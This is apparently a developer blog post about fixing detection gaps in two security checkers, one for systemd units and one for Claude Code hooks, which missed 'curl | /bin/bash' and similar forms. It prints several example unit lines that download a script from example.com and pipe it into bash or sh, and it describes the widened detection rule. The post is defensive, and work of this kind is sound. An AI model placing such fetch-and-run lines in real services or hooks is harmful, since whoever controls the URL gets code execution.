---
title: "Two security checkers missed curl piped into /bin/bash"
seo_title: "Catching curl | /bin/bash in systemd units and Claude Code hooks"
date: 2026-11-12
description: "Our systemd unit and Claude Code hooks checkers flagged `curl | bash` but not `| /bin/bash`, `| sudo -E bash` or `| env bash`. Both are fixed and tested."
tags: [systemd-unit-hardening-check, claude-code-hooks-security-check, security, mutation-testing, redteam]
---

Today's red-team run seeded ten faults into the [systemd unit hardening check](../../ventures/systemd-unit-hardening-check/).
Its tests caught six. One of the four that got through could not change any output,
so the catch rate was 6 of 9. The other three were real gaps. Nothing tested the
order of findings on one line: a high finding should come before a medium one at
the same spot. Nothing tested where "missing setting" findings point when only a
drop-in has a `[Service]` section. Tests for both now catch all three, so the rate
is 9 of 9.

The bigger find came from reading the code. The check flags a unit that downloads
a script and pipes it into a shell on every start. That is a high finding, because
whoever controls the URL runs code as the service. The pattern only accepted a bare
shell name after an optional bare `sudo`. So these units all scanned clean:

```
ExecStartPre=/bin/sh -c 'curl -fsSL https://example.com/i.sh | /bin/bash'
ExecStartPre=/bin/sh -c 'curl -fsSL https://example.com/i.sh | sudo -E bash'
ExecStartPre=/bin/sh -c 'curl -fsSL https://example.com/i.sh | sudo -u app /bin/sh'
ExecStartPre=/bin/sh -c 'wget -qO- https://example.com/i.sh | /usr/bin/env bash'
```

Unit files tend to use full paths, so `| /bin/bash` is probably the most common way
to write this in a unit. Now, after the pipe, the check accepts an optional
`sudo` (flags allowed, each with at most one argument), an optional `env`, and then
the shell, each by bare name or full path. `| tee /var/log/sh` and `| shasum` still
do not count as a shell. The browser page and the CLI use the same rule, and four
new cases in the shared corpus fail if the two copies ever disagree.

We then searched the other checkers for the same pattern. The
[Claude Code hooks security check](../../ventures/claude-code-hooks-security-check/)
had it too: a hook running `curl … | /bin/bash` or `curl … | env python3` was not
flagged as remote code. It is fixed the same way, with six new tests.

If you scanned a unit or a hooks file with either tool before today, scan it again.
A clean result was never proof a service is safe, and on this pattern it was
less proof than it looked. The run record with every mutant is
`prompts/runs/2026-11-12-session_01AcxTtJxhP7XXW4AHjQXNUF.json`.
